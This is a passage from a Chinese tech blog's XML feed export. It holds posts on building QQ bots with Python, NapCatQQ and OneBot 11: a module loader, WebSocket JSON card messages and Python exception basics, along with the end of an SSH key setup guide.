<li>可能需要 <code>sudo</code> 权限来修改 SSH 配置</li>
<li>确保妥善保管生成的私钥</li>
<li>如果已有其他 SSH 密钥，注意备份</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>使用 Ed25519 算法配置 GitHub SSH 不仅提供了更好的安全性，还能获得更优的性能。通过这个自动化脚本，我们可以快速完成配置，避免了手动操作可能带来的错误。特别是对于中国大陆用户，脚本中的 443 端口配置可以有效解决连接问题。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a class="link"   href="https://docs.github.com/cn/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent" >GitHub 官方文档：生成新的 SSH 密钥<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://ed25519.cr.yp.to/" >Ed25519: high-speed high-security signatures<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Github</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>SSH</tag>
        <tag>Shell</tag>
        <tag>Ed25519</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Python + OneBot 11的QQ机器人模块加载器的实现</title>
    <url>/posts/e35cbf79.html</url>
    <content><![CDATA[<p>源代码请看：<a class="link"   href="https://github.com/W1ndys-bot/Module-Loader?tab=readme-ov-file#/" >W1ndys-bot&#x2F;Module-Loader: 对接 OneBot 的 Python 模块加载器 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>对接 OneBot 的 Python 模块加载器</p>
<h2 id="介绍及背景"><a href="#介绍及背景" class="headerlink" title="介绍及背景"></a>介绍及背景</h2><p>Python 编写的模块加载器，使用 WebSocket 客户端模式对接上游服务，支持 OneBot 协议，如遇到问题请提 issue</p>
<p>本加载器不以插件的形式进行加载，而是以模块的形式进行加载。</p>
<p>这也就意味着，本加载器的功能增加，直接写代码即可，无需配置相关插件信息。</p>
<blockquote>
<p>写这个加载器的原因是，了解到了 mf 师傅的插件式加载器，但我本人并不习惯这种方法，于是就写了这个模块式加载器，整个加载器的配置全部采用 Python 模块化编程，功能的开发模式完全基于原生 Onebot11。</p>
<p>有关插件式加载器的文档请参考：<a class="link"   href="https://github.com/School-Robot/Plugin-Loader" >School-Robot&#x2F;Plugin-Loader: 用于对接 OneBot 的 Python 插件加载器 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h2 id="加载器特色"><a href="#加载器特色" class="headerlink" title="加载器特色"></a>加载器特色</h2><ul>
<li>模块化编程，易于维护</li>
<li>支持断线重连，无需手动重启</li>
<li>支持上线提醒（QQ），掉线提醒（钉钉）</li>
<li>支持 OneBot 11 标准，采用原生的 OneBot 11 标准进行开发</li>
</ul>
<h3 id="API-文档"><a href="#API-文档" class="headerlink" title="API 文档"></a>API 文档</h3><p>OneBot 11 标准 <a class="link"   href="https://github.com/botuniverse/onebot-11#/" >botuniverse &#x2F;onebot-11: OneBot 11 标准 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>go-cqhttp <a class="link"   href="https://docs.go-cqhttp.org/api/" >API | go-cqhttp 帮助中心<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<blockquote>
<p>备注：本机器人实现基于 <strong>Python</strong> 做核心开发，使用 <strong>NapCatQQ</strong> 作为消息平台，<strong>OneBot 11</strong> 作为 QQ 机器人 API 实现。</p>
</blockquote>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></div>

<h3 id="配置基本信息"><a href="#配置基本信息" class="headerlink" title="配置基本信息"></a>配置基本信息</h3><h4 id="配置-ws-连接和管理员"><a href="#配置-ws-连接和管理员" class="headerlink" title="配置 ws 连接和管理员"></a>配置 ws 连接和管理员</h4><p>打开 <code>app/config.py</code></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">owner_id = [<span class="number">123</span>]  <span class="comment"># 机器人 root 管理员 QQ 号</span></span><br><span class="line"></span><br><span class="line">ws_url = <span class="string">&quot;xxx&quot;</span>  <span class="comment"># napcatQQ 监听的 WebSocket API 地址</span></span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;xxx&quot;</span>  <span class="comment"># 如果需要认证，请填写认证 token</span></span><br></pre></td></tr></table></figure></div>

<h4 id="配置钉钉通知"><a href="#配置钉钉通知" class="headerlink" title="配置钉钉通知"></a>配置钉钉通知</h4><p>打开 <code>app/config.py</code></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">这里替换为你自己的 TOKEN，不要直接用我的，我的有 IP 验证，用我的也没用</span><br><span class="line">DD_BOT_TOKEN = <span class="string">&quot;xxx&quot;</span></span><br><span class="line"><span class="comment"># 这里替换为你自己的 SECRET，不要直接用我的，我的有 IP 验证，用我的也没用</span></span><br><span class="line">DD_BOT_SECRET = <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="开发文档"><a href="#开发文档" class="headerlink" title="开发文档"></a>开发文档</h2><p>开发功能请参考：<a href="dev.md">dev.md</a></p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
      </tags>
  </entry>
  <entry>
    <title>基于NapCatQQ和Python的 QQ 机器人实现</title>
    <url>/posts/56783215.html</url>
    <content><![CDATA[<h2 id="开发背景"><a href="#开发背景" class="headerlink" title="开发背景"></a>开发背景</h2><blockquote>
<p>也是我与 QQbot 之间的羁绊吧，作者的一些碎碎念</p>
</blockquote>
<p>久违了啊，老友，说不出的感觉涌上心头 😇</p>
<p>还记得那会是初中，忘了上几年级了，大概在 17 年左右认识了酷 Q，只能用别人的插件不会自己开发功能，学了一段时间苦于环境不会配置放弃了，后来 18，19 年左右认识了 QRspeed（-dic），基于关键词的词库程序，看着语法文档自己写出来一套（大概 4000 行左右吧）自己用的源码（严格来说应该叫词库称不上是源码），这是我第一次自己写自己想要的功能。但苦于 qrspeed 词库算不上真正的编程语言，所以一直拿不出手。后来因为寄宿学校，版本更新很快，逐渐跟不上了语法的变化了。</p>
<p>后来，晨风机器人作者喝茶，酷 Q 关站，qrspeed 也停运，受 tx 打压 QQ 机器人几乎死路一条。高中了解到 nonebot2，环境不会搭，放弃了上大学之后了解到 mirai，这是我第三个用了很久一段时间的机器人框架，可惜的是，我认识他的时候他就已经到寒冬了，随处可见的 code &#x3D; 45，封过 n 次的 QQ 号…..不过我依旧想自己开发自己想要的功能，由于 mirai 基于 kotlin，学了一段时间 kotlin 没学会，环境也没搭好，又放弃了，还因此认识了小白师傅。（电脑也因此中了一次蠕虫）</p>
<p>大二，认识了 koishi 和 napcatQQ，一开始不懂 Websocket 协议，也没深入了解 napcatQQ 的工作原理，仍然是只会安装别人写好的 koishi 插件，奈何我 2c2g 的服务器跑 koishi 很慢，基于 TypeScript 的 koishi，本来打算这次暑假学一学自己开发 TS 插件。</p>
<p>但是，今天忽然想起来先前 Liu 提到过一次基于 Python 和 napcatQQ 的，他已经实现了，我也可以试试，看看套神 mumuzi 的博客基于 http 协议处理消息，借助 ChatGPT 实现了和他完全不一样的 WebSocket 协议，搞了整整一下午一个晚上，基本实现了敏感词监控，禁言解禁，撤回等功能。（github.com&#x2F;W1ndys&#x2F;bot）感觉还是 ChatGPT 牛逼，我一个从来没听说过 Python 异步的小白都能写出来想要的功能。</p>
<p>真正的编程语言实现，真正方便的环境搭建一切都得益于开箱即用的 Python 和万能的 ChatGPT 四年，终于找到当年的感觉了。</p>
<h2 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h2><p><del class="mask">我推荐使用 Linux docker 容器安装，如果运行环境崩了可以重新导入镜像</del></p>
<p><del class="mask">docker 安装：<a class="link"   href="https://github.com/NapNeko/NapCat-Docker" >NapNeko&#x2F;NapCat-Docker: NapCat-Docker (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></del></p>
<p><del class="mask">一键安装脚本：<a class="link"   href="https://napneko.github.io/zh-CN/guide/getting-started#%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85" >NapCatQQ (napneko.github.io)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></del></p>
<p>拾雪（NapCatQQ 作者）更新了新的说明文档，安装这一部分可以直接看官方文档了，写的很明白</p>
<p><a class="link"   href="https://napneko.github.io/guide/start-install" >NapCat | NapCatQQ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>进行完这一步可以直接跳到 <a href="#%E5%AE%9E%E7%8E%B0%E5%8A%9F%E8%83%BD">实现功能</a> 部分</p>
<h2 id="实现功能"><a href="#实现功能" class="headerlink" title="实现功能"></a>实现功能</h2><p>我自己用的机器人的所有代码都开源在 <a class="link"   href="https://github.com/W1ndysBot" >W1ndysBot<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，可以参考更方便理解</p>
<p>2024 年 8 月 3 日我学习模块化编程之后，写出了模块加载器, <a class="link"   href="https://github.com/W1ndysBot/ModuleLoader#/" >W1ndysBot&#x2F;ModuleLoader: 对接 OneBot 的 Python 模块加载器<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，可以前往模块加载器继续开发</p>
<h3 id="测试消息发送"><a href="#测试消息发送" class="headerlink" title="测试消息发送"></a>测试消息发送</h3><p>假设小号与大号创建了一个群聊，这里测试的是群聊中是否出现指定字符串，出现则发送一条消息，以“测试”和“测试成功”为例</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../images/QQbot/image-20240728191204205.png"
                      alt="image-20240728191204205"
                ></p>
<h2 id="W1ndysBot-的开发"><a href="#W1ndysBot-的开发" class="headerlink" title="W1ndysBot 的开发"></a>W1ndysBot 的开发</h2><p>请看我的其他博客，待更新</p>
<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p><a class="link"   href="https://napneko.github.io/zh-CN/" >NapCatQQ (napneko.github.io)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.cursor.com/" >Cursor - The AI Code Editor<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
      </tags>
  </entry>
  <entry>
    <title>基于NapCatQQ和Python的QQ机器人开发——JSON消息的发送（消息段数组的运用）</title>
    <url>/posts/9bd67233.html</url>
    <content><![CDATA[<h2 id="什么是消息段数组"><a href="#什么是消息段数组" class="headerlink" title="什么是消息段数组"></a>什么是消息段数组</h2><p>请看 onebot11 官方文档 <a class="link"   href="https://github.com/botuniverse/onebot-11/blob/master/message/array.md#%E6%B6%88%E6%81%AF%E6%AE%B5%E6%95%B0%E7%BB%84" >onebot-11&#x2F;message&#x2F;array.md at master · botuniverse&#x2F;onebot-11 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>以前我都是直接发的 CQ 码（什么是 CQ 码？<a class="link"   href="https://github.com/botuniverse/onebot-11/blob/master/message/string.md#cq-%E7%A0%81%E6%A0%BC%E5%BC%8F" >onebot-11&#x2F;message&#x2F;string.md at master · botuniverse&#x2F;onebot-11 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>）</p>
<p>今天突发奇想的想试试直接发推荐卡片，当我尝试发 CQ 码的时候失败了，然后我去找 NapCatQQ 开发者拾雪问了一下，大佬是这么说的，不能直接用 CQ 码，因为涉及到签名等东西，需要用扩展接口，让我去看文档。</p>
<p>去文档找了一下，确实找到了，我本以为能顺理成章的解决问题，但是不出意外的话出意外了。</p>
<p>下面内容基于 Python 和正向 Websocket 连接实现</p>
<blockquote>
<p>说句题外话，小白的一个大误区，向别人提问题，尤其是计算机相关的问题，一定要一次性的把问题说全，可以分好几条发，被提问者一般不会因此嫌弃厌烦，反而会很喜欢，因为你把尽可能用到的信息全都提供出来了，有助于问题的解决</p>
<p>新手要学会的几件事，提问的时候要尽可能多的提供</p>
<ol>
<li>相关的运行日志，报错日志</li>
<li>相关的源代码</li>
<li>相关的必要的截图</li>
<li>做好敏感数据的处理</li>
</ol>
</blockquote>
<h2 id="如何发消息"><a href="#如何发消息" class="headerlink" title="如何发消息"></a>如何发消息</h2><p>再 Onebot11 标准文档里给出了发送消息的 API，详情可见如下</p>
<p>发送私聊消息：<a class="link"   href="https://github.com/botuniverse/onebot-11/blob/master/api/public.md#send_private_msg-%E5%8F%91%E9%80%81%E7%A7%81%E8%81%8A%E6%B6%88%E6%81%AF" >onebot-11&#x2F;api&#x2F;public.md at master · botuniverse&#x2F;onebot-11 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>发送群消息：<a class="link"   href="https://github.com/botuniverse/onebot-11/blob/master/api/public.md#send_group_msg-%E5%8F%91%E9%80%81%E7%BE%A4%E6%B6%88%E6%81%AF" >onebot-11&#x2F;api&#x2F;public.md at master · botuniverse&#x2F;onebot-11 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>发送消息：<a class="link"   href="https://github.com/botuniverse/onebot-11/blob/master/api/public.md#send_msg-%E5%8F%91%E9%80%81%E6%B6%88%E6%81%AF" >onebot-11&#x2F;api&#x2F;public.md at master · botuniverse&#x2F;onebot-11 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="如何通信"><a href="#如何通信" class="headerlink" title="如何通信"></a>如何通信</h3><p>NapCatQQ 基于 Onebot11 协议进行通信，这里我只以正向 Websocket 通信协议为例描述。通过 WebSocket 消息发送的数据全部使用 JSON 格式。</p>
<p> 具体的文档详情可见：<a class="link"   href="https://github.com/botuniverse/onebot-11/blob/master/communication/ws.md#%E6%AD%A3%E5%90%91-websocket" >onebot-11&#x2F;communication&#x2F;ws.md at master · botuniverse&#x2F;onebot-11 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>API 的运用：<a class="link"   href="https://github.com/botuniverse/onebot-11/blob/master/communication/ws.md#api-%E6%8E%A5%E5%8F%A3" >onebot-11&#x2F;communication&#x2F;ws.md at master · botuniverse&#x2F;onebot-11 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>例如利用 API 发送一条私聊消息</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;send_private_msg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="number">10001000</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你好&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;echo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>连接后向 Onebot 发送此 JSON 消息，就可以实现向 10001000 发送“你好”这条消息，其它参数可以去 Onebot11 文档查看，这里不过多描述，经测试，这里的 <strong>user_id 可以是字符串型也可以是整形</strong>。</p>
<p>消息是 OneBot 标准中一个重要的数据类型，在发送消息的 API 和接收消息的事件中都有相关字段。目前消息的格式分为两种：字符串（string）和数组（array）。</p>
<p><code>message</code> 的值，可以是字符串也可以是数组，具体的文档请看 <a class="link"   href="https://github.com/botuniverse/onebot-11/blob/master/message/README.md" >onebot-11&#x2F;message&#x2F;README.md at master · botuniverse&#x2F;onebot-11 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>字符串格式可以包括 CQ 码，例如 <code>[CQ:face,id=178]看看我刚拍的照片[CQ:image,file=123.jpg]</code></p>
<p>数组格式请看 <a class="link"   href="https://github.com/botuniverse/onebot-11/blob/master/message/array.md" >onebot-11&#x2F;message&#x2F;array.md at master · botuniverse&#x2F;onebot-11 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>消息段是 CQ 码在数组格式中的表示形式，基本格式如下：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123.jpg&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="如何发-JSON-消息"><a href="#如何发-JSON-消息" class="headerlink" title="如何发 JSON 消息"></a>如何发 JSON 消息</h2><p>有关于 Onebot11 的 JSON 消息格式文档可以看 <a class="link"   href="https://github.com/botuniverse/onebot-11/blob/master/message/segment.md#JSON-%E6%B6%88%E6%81%AF" >onebot-11&#x2F;message&#x2F;segment.md at master · botuniverse&#x2F;onebot-11 (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>如何发 JSON 消息，就是在用 API 发送消息的基础上，把 <code>message</code> 的值，传入 JSON 就可以</p>
<p>例如下面 JSON，把这段 JSON 消息传入就可以发送</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;json&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;\&quot;app\&quot;: ...&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="发-JSON-消息的实践"><a href="#发-JSON-消息的实践" class="headerlink" title="发 JSON 消息的实践"></a>发 JSON 消息的实践</h2><p>利用 JSON 消息发送推荐群&#x2F;好友卡片</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"># 发送群消息</span><br><span class="line">async def send_group_msg(websocket<span class="punctuation">,</span> group_id<span class="punctuation">,</span> content)<span class="punctuation">:</span></span><br><span class="line">    message = <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;send_group_msg&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;group_id&quot;</span><span class="punctuation">:</span> group_id<span class="punctuation">,</span> <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> content<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    await websocket.send(json.dumps(message))</span><br><span class="line">    logging.info(f<span class="string">&quot;已发送群消息: &#123;message&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 给群分享加群卡片</span><br><span class="line">async def send_ArkShareGroupEx_group(websocket<span class="punctuation">,</span> group_id<span class="punctuation">,</span> target_group_id)<span class="punctuation">:</span></span><br><span class="line">    try<span class="punctuation">:</span></span><br><span class="line">        message = <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ArkShareGroupEx&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;group_id&quot;</span><span class="punctuation">:</span> str(group_id)<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">        await websocket.send(json.dumps(message))</span><br><span class="line">        response = json.loads(await websocket.recv())</span><br><span class="line">        data = response.get(<span class="string">&quot;data&quot;</span>)</span><br><span class="line">        await send_json_msg_group(websocket<span class="punctuation">,</span> target_group_id<span class="punctuation">,</span> data)</span><br><span class="line">    except Exception as e<span class="punctuation">:</span></span><br><span class="line">        logging.error(f<span class="string">&quot;发送加群卡片失败: &#123;e&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 向群发送JSON消息</span><br><span class="line">async def send_json_msg_group(websocket<span class="punctuation">,</span> group_id<span class="punctuation">,</span> data)<span class="punctuation">:</span></span><br><span class="line">    try<span class="punctuation">:</span></span><br><span class="line">        message = <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;json&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> data<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span>  # 注意这边两层data，详情可见https<span class="punctuation">:</span><span class="comment">//github.com/botuniverse/onebot-11/blob/master/message/segment.md#json-%E6%B6%88%E6%81%AF</span></span><br><span class="line">        await send_group_msg(websocket<span class="punctuation">,</span> group_id<span class="punctuation">,</span> message)</span><br><span class="line">    except Exception as e<span class="punctuation">:</span></span><br><span class="line">        logging.error(f<span class="string">&quot;发送JSON消息失败: &#123;e&#125;&quot;</span>)</span><br></pre></td></tr></table></figure></div>



<ol>
<li>首先在 <code>send_ArkShareGroupEx_group</code> 函数里提取处 JSON 信息</li>
<li>在 <code>send_json_msg_group</code> 把 JSON 封装成 <code>message</code></li>
<li>在 <code>send_group_msg</code> 通过 API 发出去</li>
</ol>
<p><del class="mask">这里其实如果是要发 JSON 消息的话，除了数组形式，还有一种方法前面也提到了，就是 CQ 码</del></p>
<p>试过了，CQ 码不可以，会被解析成 CQ 码字符串直接发 JSON 源码而不是卡片</p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
      </tags>
  </entry>
  <entry>
    <title>基于NapCatQQ和Python的QQ机器人开发——Python常用语法</title>
    <url>/posts/d5fe3115.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在写机器人的过程中不可避免的碰到语法的学习，本页梳理了常用的语法，以及记录开发机器人以来遇到的各种问题，需要注意的点。<br>。</p>
<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>尽可能的分离函数，让某特殊功能的函数单独定义，以便于反复调用</p>
<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>每个函数中尽量都要有异常处理，好处一个是方便快速调试报错点，第二个就是不会因为异常导致程序退出。</p>
<p>更详细的内容可以看 <a class="link"   href="https://www.runoob.com/python/python-exceptions.html#/" >Python 异常处理 | 菜鸟教程 (runoob.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">&lt;语句&gt;        <span class="comment">#运行别的代码</span></span><br><span class="line"><span class="keyword">except</span> &lt;名字&gt;：</span><br><span class="line">&lt;语句&gt;        <span class="comment">#如果在 try 部份  引发了&#x27;name&#x27;异常</span></span><br><span class="line"><span class="keyword">except</span> &lt;名字&gt;，&lt;数据&gt;:</span><br><span class="line">&lt;语句&gt;        <span class="comment">#如果引发了&#x27;name&#x27;异常，获得附加的数据</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">&lt;语句&gt;        <span class="comment">#如果没有异常发生</span></span><br></pre></td></tr></table></figure></div>

<table>
<thead>
<tr>
<th align="left">异常名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">BaseException</td>
<td align="left">所有异常的基类</td>
</tr>
<tr>
<td align="left">SystemExit</td>
<td align="left">解释器请求退出</td>
</tr>
<tr>
<td align="left">KeyboardInterrupt</td>
<td align="left">用户中断执行(通常是输入^C)</td>
</tr>
<tr>
<td align="left">Exception</td>
<td align="left">常规错误的基类</td>
</tr>
<tr>
<td align="left">StopIteration</td>
<td align="left">迭代器没有更多的值</td>
</tr>
<tr>
<td align="left">GeneratorExit</td>
<td align="left">生成器(generator)发生异常来通知退出</td>
</tr>
<tr>
<td align="left">StandardError</td>
<td align="left">所有的内建标准异常的基类</td>
</tr>
<tr>
<td align="left">ArithmeticError</td>
<td align="left">所有数值计算错误的基类</td>
</tr>
<tr>
<td align="left">FloatingPointError</td>
<td align="left">浮点计算错误</td>
</tr>
<tr>
<td align="left">OverflowError</td>
<td align="left">数值运算超出最大限制</td>
</tr>
<tr>
<td align="left">ZeroDivisionError</td>
<td align="left">除(或取模)零 (所有数据类型)</td>
</tr>
<tr>
<td align="left">AssertionError</td>
<td align="left">断言语句失败</td>
</tr>
<tr>
<td align="left">AttributeError</td>
<td align="left">对象没有这个属性</td>
</tr>
<tr>
<td align="left">EOFError</td>
<td align="left">没有内建输入, 到达 EOF 标记</td>
</tr>
<tr>
<td align="left">EnvironmentError</td>
<td align="left">操作系统错误的基类</td>
</tr>
<tr>
<td align="left">IOError</td>
<td align="left">输入&#x2F;输出操作失败</td>
</tr>
<tr>
<td align="left">OSError</td>
<td align="left">操作系统错误</td>
</tr>
<tr>
<td align="left">WindowsError</td>
<td align="left">系统调用失败</td>
</tr>
<tr>
<td align="left">ImportError</td>
<td align="left">导入模块&#x2F;对象失败</td>
</tr>
<tr>
<td align="left">LookupError</td>
<td align="left">无效数据查询的基类</td>
</tr>
<tr>
<td align="left">IndexError</td>
<td align="left">序列中没有此索引(index)</td>
</tr>
<tr>
<td align="left">KeyError</td>
<td align="left">映射中没有这个键</td>
</tr>
<tr>
<td align="left">MemoryError</td>
<td align="left">内存溢出错误(对于 Python 解释器不是致命的)</td>
</tr>
<tr>
<td align="left">NameError</td>
<td align="left">未声明&#x2F;初始化对象 (没有属性)</td>
</tr>
<tr>
<td align="left">UnboundLocalError</td>
<td align="left">访问未初始化的本地变量</td>
</tr>
<tr>
<td align="left">ReferenceError</td>
<td align="left">弱引用(Weak reference)试图访问已经垃圾回收了的对象</td>
</tr>
<tr>
<td align="left">RuntimeError</td>
<td align="left">一般的运行时错误</td>
</tr>
<tr>
<td align="left">NotImplementedError</td>
<td align="left">尚未实现的方法</td>
</tr>
<tr>
<td align="left">SyntaxError</td>
<td align="left">Python 语法错误</td>
</tr>
<tr>
<td align="left">IndentationError</td>
<td align="left">缩进错误</td>
</tr>
<tr>
<td align="left">TabError</td>
<td align="left">Tab 和空格混用</td>
</tr>
<tr>
<td align="left">SystemError</td>
<td align="left">一般的解释器系统错误</td>
</tr>
<tr>
<td align="left">TypeError</td>
<td align="left">对类型无效的操作</td>
</tr>
<tr>
<td align="left">ValueError</td>
<td align="left">传入无效的参数</td>
</tr>
<tr>
<td align="left">UnicodeError</td>
<td align="left">Unicode 相关的错误</td>
</tr>
<tr>
<td align="left">UnicodeDecodeError</td>
<td align="left">Unicode 解码时的错误</td>
</tr>
<tr>
<td align="left">UnicodeEncodeError</td>
<td align="left">Unicode 编码时错误</td>
</tr>
<tr>
<td align="left">UnicodeTranslateError</td>
<td align="left">Unicode 转换时错误</td>
</tr>
<tr>
<td align="left">Warning</td>
<td align="left">警告的基类</td>
</tr>
